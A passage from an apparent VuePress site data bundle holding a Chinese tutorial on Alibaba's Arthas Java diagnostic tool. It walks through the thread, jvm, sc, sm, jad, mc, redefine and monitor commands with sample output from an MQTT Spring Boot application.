final（表示这个类不能被继承）、sealed（表示这个子类也可以有其他密封的或非密封的子类） 或是 non-sealed （表示这个子类不能有子类，但它可以被其他类继承）类型',charsets:{cjk:!0}},{title:"JVM 模块介绍",frontmatter:{title:"JVM 模块介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/language/cj/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/02.%E4%BB%93%E9%A2%89/01.%E5%9F%BA%E7%A1%80/1.%E4%BB%93%E9%A2%89.html",relativePath:"00.语言/02.仓颉/01.基础/1.仓颉.md",key:"v-747c7e31",path:"/language/cj/1/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"Alibaba Arthas",frontmatter:{title:"Alibaba Arthas",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/4/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/4.Alibaba%20Arthas.html",relativePath:"00.语言/01.JAVA/04.其他/4.Alibaba Arthas.md",key:"v-1b2fbd05",path:"/language/java/other/4/",headers:[{level:2,title:"Arthas 是什么？",slug:"arthas-是什么",normalizedTitle:"arthas 是什么？",charIndex:2},{level:2,title:"这里列出一些常用命令并一一讲解",slug:"这里列出一些常用命令并一一讲解",normalizedTitle:"这里列出一些常用命令并一一讲解",charIndex:156},{level:2,title:"dashboard",slug:"dashboard",normalizedTitle:"dashboard",charIndex:180},{level:2,title:"thread",slug:"thread",normalizedTitle:"thread",charIndex:190},{level:2,title:"jvm",slug:"jvm",normalizedTitle:"jvm",charIndex:56},{level:2,title:"sc",slug:"sc",normalizedTitle:"sc",charIndex:201},{level:2,title:"sm",slug:"sm",normalizedTitle:"sm",charIndex:204},{level:2,title:"jad",slug:"jad",normalizedTitle:"jad",charIndex:207},{level:2,title:"mc",slug:"mc",normalizedTitle:"mc",charIndex:211},{level:2,title:"redefine",slug:"redefine",normalizedTitle:"redefine",charIndex:214},{level:2,title:"monitor",slug:"monitor",normalizedTitle:"monitor",charIndex:223},{level:2,title:"watch",slug:"watch",normalizedTitle:"watch",charIndex:231}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Arthas 是什么？ 这里列出一些常用命令并一一讲解 dashboard thread jvm sc sm jad mc redefine monitor watch",content:'# Arthas 是什么？\n\nArthas 是 Alibaba 开发得一款 java 诊断工具，可以帮我们查看 jvm 使用情况，查看线程数，排除阻塞线程；监听类和方法得调用次数，失败次数 (失败率)，执行时常；监听方法得入参，出参，异常信息；快速反编译查看源码，并修改源码，编译运行；查看堆栈信息等。\n\n\n# 这里列出一些常用命令并一一讲解\n\n最常用得命令：dashboard，thread，jvm，sc，sm，jad，mc，redefine，monitor，watch。官方地址：https://arthas.aliyun.com/\n\n\n# dashboard\n\n\n\ndashboard 当前系统的实时数据面板，按 ctrl+c 退出，当运行在 Ali-tomcat 时，会显示当前 tomcat 的实时信息，如 HTTP 请求的 qps, rt, 错误数，线程池信息等等。\n数据说明如下：\n\n * ID: Java 级别的线程 ID，注意这个 ID 不能跟 jstack 中的 nativeID 一一对应\n * NAME: 线程名\n * GROUP: 线程组名\n * PRIORITY: 线程优先级，1~10 之间的数字，越大表示优先级越高\n * STATE: 线程的状态\n * CPU%: 线程消耗的 cpu 占比，采样 100ms，将所有线程在这 100ms 内的 cpu 使用量求和，再算出每个线程的 cpu 使用占比。\n * TIME: 线程运行总时间，数据格式为 分：秒\n * INTERRUPTED: 线程当前的中断位状态\n * DAEMON: 是否是守护线程\n\n\n# thread\n\n查看当前线程信息，查看线程的堆栈\n示例： thread -n 3 找出前 3 个线程的堆栈信息\n\n * id 线程 id;\n * -n 指定最忙的前 N 个线程并打印堆栈；\n * -b 找出当前阻塞其他线程的线程；\n * -i <value> 指定 cpu 占比统计的采样间隔单位为毫秒，建议 5000\n\n$ thread -n 3\n"as-command-execute-daemon" Id=58 cpuUsage=76% RUNNABLE\n    at java.management@12.0.1/sun.management.ThreadImpl.dumpThreads0(Native Method)\n    at java.management@12.0.1/sun.management.ThreadImpl.getThreadInfo(ThreadImpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.processTopBusyThreads(ThreadCommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.process(ThreadCommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.process(AnnotatedCommandImpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.access$100(AnnotatedCommandImpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.ProcessImpl$CommandProcessTask.run(ProcessImpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n    Number of locked synchronizers = 1\n    - java.util.concurrent.ThreadPoolExecutor$Worker@7808db3c\n\n\n"NioBlockingSelector.BlockPoller-1" Id=24 cpuUsage=17% RUNNABLE (in native)\n    at java.base@12.0.1/sun.nio.ch.EPoll.wait(Native Method)\n    at java.base@12.0.1/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:124)\n    -  locked sun.nio.ch.Util$2@1a574b17\n    -  locked sun.nio.ch.EPollSelectorImpl@7b0d44f5\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:136)\n    at org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.run(NioBlockingSelector.java:304)\n\n\n"http-nio-8087-ClientPoller-1" Id=36 cpuUsage=5% RUNNABLE (in native)\n    at java.base@12.0.1/sun.nio.ch.EPoll.wait(Native Method)\n    at java.base@12.0.1/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:124)\n    -  locked sun.nio.ch.Util$2@703ba4c0\n    -  locked sun.nio.ch.EPollSelectorImpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:136)\n    at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:743)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n\nAffect(row-cnt:0) cost in 131 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n示例：thread 打出所有运行线程\n\n$ thread\nThreads Total: 37, NEW: 0, RUNNABLE: 14, BLOCKED: 0, WAITING: 17, TIMED_WAITING: 6, TERMINATED: 0                                                                                                                                       \nID                 NAME                                                      GROUP                                  PRIORITY           STATE               %CPU               TIME               INTERRUPTED         DAEMON             \n59                 as-command-execute-daemon                                 system                                 10                 RUNNABLE            100                0:0                false               true               \n42                 AsyncAppender-Worker-arthas-cache.result.AsyncAppender    system                                 9                  WAITING             0                  0:0                false               true               \n40                 Attach Listener                                           system                                 9                  RUNNABLE            0                  0:0                false               true               \n14                 Catalina-utility-1                                        main                                   1                  WAITING             0                  0:1                false               false              \n15                 Catalina-utility-2                                        main                                   1                  TIMED_WAITING       0                  0:0                false               false              \n10                 Common-Cleaner                                            InnocuousThreadGroup                   8                  TIMED_WAITING       0                  0:0                false               true               \n39                 DestroyJavaVM                                             main                                   5                  RUNNABLE            0                  0:12               false               false              \n3                  Finalizer                                                 system                                 8                  WAITING             0                  0:0                false               true               \n19                 MQTT Call: mqttId_inbound                                 main                                   5                  WAITING             0                  0:0                false               false              \n23                 MQTT Ping: mqttId_inbound                                 main                                   5                  TIMED_WAITING       0                  0:0                false               false              \n20                 MQTT Rec: mqttId_inbound                                  main                                   5                  RUNNABLE            0                  0:0                false               false              \n21                 MQTT Snd: mqttId_inbound                                  main                                   5                  WAITING             0                  0:0                false               false              \n24                 NioBlockingSelector.BlockPoller-1                         main                                   5                  RUNNABLE            0                  0:0                false               true               \n2                  Reference Handler                                         system                                 10                 RUNNABLE            0                  0:0                false               true               \n4                  Signal Dispatcher                                         system                                 9                  RUNNABLE            0                  0:0                false               true               \n16                 container-0                                               main                                   5                  TIMED_WAITING       0                  0:0                false               false              \n37                 http-nio-8087-Acceptor-0                                  main                                   5                  RUNNABLE            0                  0:0                false               true               \n35                 http-nio-8087-ClientPoller-0                              main                                   5                  RUNNABLE            0                  0:0                false               true               \n36                 http-nio-8087-ClientPoller-1                              main                                   5                  RUNNABLE            0                  0:0                false               true               \n25                 http-nio-8087-exec-1                                      main                                   5                  WAITING             0                  0:0                false               true               \n34                 http-nio-8087-exec-10                                     main                                   5                  WAITING             0                  0:0                false               true               \n26                 http-nio-8087-exec-2                                      main                                   5                  WAITING             0                  0:0                false               true               \n27                 http-nio-8087-exec-3                                      main                                   5                  WAITING             0                  0:0                false               true               \n28                 http-nio-8087-exec-4                                      main                                   5                  WAITING             0                  0:0                false               true               \n29                 http-nio-8087-exec-5                                      main                                   5                  WAITING             0                  0:0                false               true               \n30                 http-nio-8087-exec-6                                      main                                   5                  WAITING             0                  0:0                false               true               \n31                 http-nio-8087-exec-7                                      main                                   5                  WAITING             0                  0:0                false               true               \n32                 http-nio-8087-exec-8                                      main                                   5                  WAITING             0                  0:0                false               true               \n33                 http-nio-8087-exec-9                                      main                                   5                  WAITING             0                  0:0                false               true               \n44                 job-timeout                                               system                                 9                  TIMED_WAITING       0                  0:0                false               true               \n45                 nioEventLoopGroup-2-1                                     system                                 10                 RUNNABLE            0                  0:0                false               false              \n49                 nioEventLoopGroup-2-2                                     system                                 10                 RUNNABLE            0                  0:1                false               false              \n53                 nioEventLoopGroup-2-3                                     system                                 10                 RUNNABLE            0                  0:0                false               false              \n46                 nioEventLoopGroup-3-1                                     system                                 10                 RUNNABLE            0                  0:0                false               false              \n22                 pool-2-thread-4                                           main                                   5                  WAITING             0                  0:0                false               false              \n47                 pool-3-thread-1                                           system                                 5                  TIMED_WAITING       0                  0:0                false               false              \n48                 pool-4-thread-1                                           system                                 5                  WAITING             0                  0:0                false               false              \nAffect(row-cnt:0) cost in 113 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n示例：thread 20 查看线程 id 为 20 的堆栈信息\n\n$ thread 20\n"MQTT Rec: mqttId_inbound" Id=20 RUNNABLE (in native)\n    at java.base@12.0.1/java.net.SocketInputStream.socketRead0(Native Method)\n    at java.base@12.0.1/java.net.SocketInputStream.socketRead(SocketInputStream.java:115)\n    at java.base@12.0.1/java.net.SocketInputStream.read(SocketInputStream.java:168)\n    at java.base@12.0.1/java.net.SocketInputStream.read(SocketInputStream.java:140)\n    at java.base@12.0.1/java.net.SocketInputStream.read(SocketInputStream.java:200)\n    at java.base@12.0.1/java.io.DataInputStream.readByte(DataInputStream.java:270)\n    at org.eclipse.paho.client.mqttv3.internal.wire.MqttInputStream.readMqttWireMessage(MqttInputStream.java:92)\n    at org.eclipse.paho.client.mqttv3.internal.CommsReceiver.run(CommsReceiver.java:133)\n    at java.base@12.0.1/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)\n    at java.base@12.0.1/java.util.concurrent.FutureTask.run(FutureTask.java:264)\n    at java.base@12.0.1/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n    Number of locked synchronizers = 1\n    - java.util.concurrent.ThreadPoolExecutor$Worker@79cf8c25\n\nAffect(row-cnt:0) cost in 33 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n示例：thread -b 找出阻塞其他线程的线程\n\n$ thread -b\nNo most blocking thread found!\nAffect(row-cnt:0) cost in 43 ms.\n\n\n1\n2\n3\n\n\n示例：thread -n 3 -i 5000 阻塞指定 5 秒后收到前 3 线程的堆栈信息\n\n$ thread -n 3  -i 5000\n"Catalina-utility-1" Id=14 cpuUsage=21% TIMED_WAITING on java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject@72b49c8\n    at java.base@12.0.1/jdk.internal.misc.Unsafe.park(Native Method)\n    -  waiting on java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject@72b49c8\n    at java.base@12.0.1/java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:235)\n    at java.base@12.0.1/java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2123)\n    at java.base@12.0.1/java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1182)\n    at java.base@12.0.1/java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:899)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1054)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1114)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n\n"http-nio-8087-ClientPoller-1" Id=36 cpuUsage=14% RUNNABLE (in native)\n    at java.base@12.0.1/sun.nio.ch.EPoll.wait(Native Method)\n    at java.base@12.0.1/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:124)\n    -  locked sun.nio.ch.Util$2@703ba4c0\n    -  locked sun.nio.ch.EPollSelectorImpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:136)\n    at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:743)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n\n"as-command-execute-daemon" Id=62 cpuUsage=10% RUNNABLE\n    at java.management@12.0.1/sun.management.ThreadImpl.dumpThreads0(Native Method)\n    at java.management@12.0.1/sun.management.ThreadImpl.getThreadInfo(ThreadImpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.processTopBusyThreads(ThreadCommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.process(ThreadCommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.process(AnnotatedCommandImpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.access$100(AnnotatedCommandImpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.ProcessImpl$CommandProcessTask.run(ProcessImpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n    Number of locked synchronizers = 1\n    - java.util.concurrent.ThreadPoolExecutor$Worker@2d2909be\n\n\nAffect(row-cnt:0) cost in 5045 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# jvm\n\n查看当前 JVM 信息，这里只拿部分信息来说\n\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n THREAD                                                                                                                                                                                                                                 \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n COUNT                                                             37                                                                                                                                                                   \n DAEMON-COUNT                                                      22                                                                                                                                                                   \n PEAK-COUNT                                                        38                                                                                                                                                                   \n STARTED-COUNT                                                     55                                                                                                                                                                   \n DEADLOCK-COUNT                                                    0                                                                                                                                                                    \n                                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n FILE-DESCRIPTOR                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n MAX-FILE-DESCRIPTOR-COUNT                                         -1                                                                                                                                                                   \n OPEN-FILE-DESCRIPTOR-COUNT                                        -1         \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nTHREAD 相关\n\n * COUNT: JVM 当前活跃的线程数\n * DAEMON-COUNT: JVM 当前活跃的守护线程数\n * PEAK-COUNT: 从 JVM 启动开始曾经活着的最大线程数\n * STARTED-COUNT: 从 JVM 启动开始总共启动过的线程次数\n * DEADLOCK-COUNT: JVM 当前死锁的线程数\n\nFILE-DESCRIPTOR 相关\n\n * MAX-FILE-DESCRIPTOR-COUNT：JVM 进程最大可以打开的文件描述符数\n * OPEN-FILE-DESCRIPTOR-COUNT：JVM 当前打开的文件描述符数\n\n\n# sc\n\n查看 JVM 已加载的类信息，\n参数说明：lass（包名 + 类名），method（方法名），[d]（输出详细信息），[E]（开启正则表达式匹配，默认为通配符匹配），[f]（输出当前类的成员变量信息（需要配合参数 - d 一起使用）），[x:]（指定输出静态变量时属性的遍历深度，默认为 0，即直接使用 toString 输出）\nclass-pattern 支持全限定名，如 com.taobao.test.AAA，也支持 com/taobao/test/AAA 这样的格式，这样，我们从异常堆栈里面把类名拷贝过来的时候，不需要在手动把 / 替换为。啦。\n示例：sc com.cloud*\n\n$ sc com.cloud*\ncom.cloud.mqtt.MqttApplication\ncom.cloud.mqtt.MqttApplication$$EnhancerBySpringCGLIB$$b4fbeb8a\ncom.cloud.mqtt.mqtt.MqttConfig\ncom.cloud.mqtt.mqtt.MqttConfig$$EnhancerBySpringCGLIB$$d1953d4e\ncom.cloud.mqtt.mqtt.MqttConfig$$EnhancerBySpringCGLIB$$d1953d4e$$FastClassBySpringCGLIB$$69e081d8\ncom.cloud.mqtt.mqtt.MqttConfig$$FastClassBySpringCGLIB$$bf72748c\ncom.cloud.mqtt.mqtt.MqttConfig$1\ncom.cloud.mqtt.mqtt.MqttReceiveConfig\ncom.cloud.mqtt.mqtt.MqttReceiveConfig$$EnhancerBySpringCGLIB$$5631a71d\ncom.cloud.mqtt.mqtt.MqttSenderConfig\ncom.cloud.mqtt.mqtt.MqttSenderConfig$$EnhancerBySpringCGLIB$$3bfb2a03\ncom.cloud.mqtt.mqtt.Publisher\ncom.cloud.mqtt.web.MqttGateway\ncom.cloud.mqtt.web.TestController\ncom.sun.proxy.$Proxy65\nAffect(row-cnt:15) cost in 20 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n示例：sc -d -f com.cloud.mqtt.web.TestController 打印类的信息以及字段的信息\n\n$ sc -d -f com.cloud.mqtt.web.TestController\n class-info        com.cloud.mqtt.web.TestController                                                                                                                                                                                    \n code-source       file:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/BOOT-INF/classes!/                                                                                                                                                 \n name              com.cloud.mqtt.web.TestController                                                                                                                                                                                    \n isInterface       false                                                                                                                                                                                                                \n isAnnotation      false                                                                                                                                                                                                                \n isEnum            false                                                                                                                                                                                                                \n isAnonymousClass  false                                                                                                                                                                                                                \n isArray           false                                                                                                                                                                                                                \n isLocalClass      false                                                                                                                                                                                                                \n isMemberClass     false                                                                                                                                                                                                                \n isPrimitive       false                                                                                                                                                                                                                \n isSynthetic       false                                                                                                                                                                                                                \n simple-name       TestController                                                                                                                                                                                                       \n modifier          public                                                                                                                                                                                                               \n annotation        org.springframework.web.bind.annotation.RestController,org.springframework.web.bind.annotation.RequestMapping                                                                                                        \n interfaces                                                                                                                                                                                                                             \n super-class       +-java.lang.Object                                                                                                                                                                                                   \n class-loader      +-org.springframework.boot.loader.LaunchedURLClassLoader@439f5b3d                                                                                                                                                    \n                     +-jdk.internal.loader.ClassLoaders$AppClassLoader@5bc2b487                                                                                                                                                         \n                       +-jdk.internal.loader.ClassLoaders$PlatformClassLoader@75d2da2d                                                                                                                                                  \n classLoaderHash   439f5b3d                                                                                                                                                                                                             \n fields            modifier  private                                                                                                                                                                                                    \n                   type      com.cloud.mqtt.web.MqttGateway                                                                                                                                                                                                      \n                   name      mqttGateway                                                                                                                                                                                                \n                   annotationjavax.annotation.Resource                                                                                                                                                                                  \n                                                                                                                                                                                                                                        \n\nAffect(row-cnt:1) cost in 15 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# sm\n\n查看已加载类的方法信息，命令只能看到由当前类所声明 (declaring) 的方法，父类则无法看到。\n参数说明：class（包名 + 类名），method（方法名称），[d]（展示每个方法的详细信息），[E]（开启正则表达式匹配，默认为通配符匹配）\n示例：sm com.cloud.mqtt.web.TestController 查询 TestController 下的所有方法\n\n$ sm  com.cloud.mqtt.web.TestController\ncom.cloud.mqtt.web.TestController <init>()V\ncom.cloud.mqtt.web.TestController test(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\ncom.cloud.mqtt.web.TestController sendMqtt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\ncom.cloud.mqtt.web.TestController sendTest(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\nAffect(row-cnt:4) cost in 12 ms.\n\n\n1\n2\n3\n4\n5\n6\n\n\n示例：sm -d com.cloud.mqtt.web.TestController test 查询 TestController 下的 test 方法详情\n\n$ sm -d com.cloud.mqtt.web.TestController test\n declaring-class  com.cloud.mqtt.web.TestController                                                                                                                                                                                     \n method-name      test                                                                                                                                                                                                                  \n modifier         public                                                                                                                                                                                                                \n annotation       org.springframework.web.bind.annotation.GetMapping                                                                                                                                                                    \n parameters       java.lang.String                                                                                                                                                                                                      \n                  java.lang.String                                                                                                                                                                                                      \n return           java.lang.String                                                                                                                                                                                                      \n exceptions                                                                                                                                                                                                                             \n\nAffect(row-cnt:1) cost in 13 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# jad\n\njad 反编译指定已加载类得源码，jad 在 Arthas Console 上，反编译出来得源码是带语法高亮得，阅读方便，当然反编译出来得 java 代码可能会存在语法错误，但不影响你的进行阅读。\n参数说明：class（包名 + 类名），[c:]（类所属 ClassLoader 得 hashcode），[E]（开启正则表达匹配，默认通配符）\n示例：反编译 com.cloud.mqtt.web.TestController\n\n$ jad com.cloud.mqtt.web.TestController\n\nClassLoader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.LaunchedURLClassLoader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.ClassLoaders$AppClassLoader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.ClassLoaders$PlatformClassLoader@75d2da2d                                                                                                                                                                     \n\nLocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/BOOT-INF/classes!/                                                                                                                                                                    \n\n/*\n * Decompiled with CFR 0_132.\n * \n * Could not load the following classes:\n *  com.cloud.mqtt.web.MqttGateway\n *  javax.annotation.Resource\n *  org.springframework.web.bind.annotation.GetMapping\n *  org.springframework.web.bind.annotation.RequestMapping\n *  org.springframework.web.bind.annotation.RequestParam\n *  org.springframework.web.bind.annotation.RestController\n */\npackage com.cloud.mqtt.web;\n\nimport com.cloud.mqtt.web.MqttGateway;\nimport javax.annotation.Resource;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\n@RequestMapping(value={"/test"})\npublic class TestController {\n    @Resource\n    private MqttGateway mqttGateway;\n\n    @GetMapping(value={"/"})\n    public String test(String a, String b) {\n        String rt = a + b;\n        return rt;\n    }\n\n    @GetMapping(value={"/send"})\n    public String sendMqtt(@RequestParam(value="data") String data, @RequestParam(value="topic") String topic) {\n        String rt = "sendMqtt";\n        return rt;\n    }\n\n    @GetMapping(value={"/sendTest"})\n    public String sendTest(@RequestParam(value="data") String data, @RequestParam(value="topic") String topic) {\n        String rt = "sendMqtt";\n        return "OK";\n    }\n}\n\nAffect(row-cnt:1) cost in 394 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n示例：反编译 com.cloud.mqtt.web.TestController test 方法\n\n$ jad com.cloud.mqtt.web.TestController test\n\nClassLoader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.LaunchedURLClassLoader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.ClassLoaders$AppClassLoader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.ClassLoaders$PlatformClassLoader@75d2da2d                                                                                                                                                                     \n\nLocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/BOOT-INF/classes!/                                                                                                                                                                    \n\n@GetMapping(value={"/"})\npublic String test(String a, String b) {\n    String rt = a + b;\n    return rt;\n}\n\nAffect(row-cnt:1) cost in 67 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# mc\n\n内存编译器，编译.java 文件生成.class 文件。编译生成.class 之后们，可以节后 redefine 命令实现热更新代码。\n参数说明：[c:]（指定 classloader），[d]（指定输出目录）\n\nmc /tmp/Test.java 编译Test.java文件\nmc -c 327a647b /tmp/Test.java 指定classloader编译\nmc -d /tmp/output /tmp/ClassA.java /tmp/ClassB.java 编译到指定目录\n\n\n1\n2\n3\n\n\n\n# redefine\n\n加载外部的 .class 文件到 redefine jvm 已加载的类。\nredefine 后的原来的类不能恢复，redefine 有可能失败（比如增加了新的 field），参考 jdk 本身的文档。\n参数说明：[c:]（ClassLoader 的 hashcode），[p:]（外部的.class 文件的完整路径，支持多个）\n\nredefine /tmp/Test.class\n结合 jad/mc 命令使用：\njad --source-only com.example.demo.arthas.user.UserController > /tmp/UserController.java\nmc /tmp/UserController.java -d /tmp\nredefine /tmp/com/example/demo/arthas/user/UserController.class\n- jad命令反编译，然后可以用其它编译器，比如vim来修改源码\n- mc命令来内存编译修改过的代码\n- 用redefine命令加载新的字节码\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nredefine 的限制，不允许新增加 field/method，正在跑的函数，没有退出不能生效，比如下面新增加的 System.out.println，只有 run () 函数里的会生效。\n\n\n# monitor\n\nmonitor 方法监控执行，是一个非实时得返回命令，意思就是可以一直监控某一个方法，直到你按 ctrl+c 结束为止。\n监控得信息包括：timestamp (时间戳)，class（java 类），method（方法，包括构造方法和普通方法），total（调用次数），success（成功次数），fail（失败次数），rt（平均 RT），fail-rate（失败率）。\n方法参数说明：class（包名 + 类名），method（方法名），[E]（开启正则表达匹配，默认通配符），[c:]（得到运行报告得间隔时间，默认是 120 秒）\n\n$ monitor -c 5 com.cloud.mqtt.web.TestController test\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 60 ms.\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:03  com.cloud.mqtt.web.TestController  test    6      6        0     0.34        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:08  com.cloud.mqtt.web.TestController  test    1      1        0     0.09        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            